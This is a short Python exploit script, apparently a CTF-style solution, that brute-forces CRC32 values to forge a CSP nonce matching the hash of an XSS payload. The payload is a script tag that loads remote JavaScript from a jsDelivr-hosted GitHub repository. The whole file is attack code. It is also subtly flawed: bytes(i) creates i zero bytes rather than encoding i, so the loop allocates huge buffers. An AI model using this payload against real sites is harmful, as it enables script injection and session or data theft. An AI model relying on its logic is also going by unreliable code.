#!/usr/bin/env python3

from zlib import crc32

def main():
    for i in range(0x0, 0xffffffff + 1):
        nonceValue = crc32(bytes(i))

        payload = f'<script nonce="{nonceValue}" src=https://cdn.jsdelivr.net/gh/mr-xhunt/alert-xss@main/abd.js></script>'.encode('utf-8')
        hashedPayload = crc32(bytes(payload))

        print(f'[*] Trying nonce {nonceValue}, hashed payload {hashedPayload}', end='\r')

        if hashedPayload == nonceValue:
            print('[+] Found collided hash!')
            print(f'[+] Nonce value: {nonceValue}')
            print(f'[+] Hashed value: {hashedPayload}')
            print(f'[+] Before hashed payload: {payload.decode()}')
            exit()

if __name__ == '__main__':
    main()
